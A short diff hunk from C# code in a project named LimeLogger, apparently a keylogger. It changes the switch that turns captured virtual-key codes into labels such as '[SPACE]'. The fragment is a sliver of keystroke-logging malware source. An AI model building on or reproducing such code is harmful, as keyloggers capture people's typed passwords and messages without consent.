@@ -61,7 +61,7 @@ namespace LimeLogger
 
                 else
                 {
-                    switch (currentKey)
+                    switch (((Keys)vkCode).ToString())
                     {
                         case "Space":
                             currentKey = "[SPACE]";
